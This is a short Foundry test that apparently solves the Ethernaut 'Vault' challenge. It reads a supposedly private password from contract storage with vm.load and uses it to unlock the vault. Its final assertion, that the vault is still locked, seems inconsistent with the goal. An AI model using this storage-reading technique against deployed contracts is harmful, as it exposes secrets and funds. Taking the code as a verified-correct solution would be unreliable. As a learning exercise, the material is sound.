// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Vault} from "../src/contracts/08_Vault.sol";

contract VaultTest is Test {
    Vault private vault;

    function setUp() public {
        vault = new Vault(bytes32("ethernaut0"));
    }

    function test_VaultExploitVulnerability() public {
        bytes32 password = vm.load(address(vault), bytes32(uint256(2)));

        vault.unlock(password);

        assertTrue(vault.locked());
    }
}
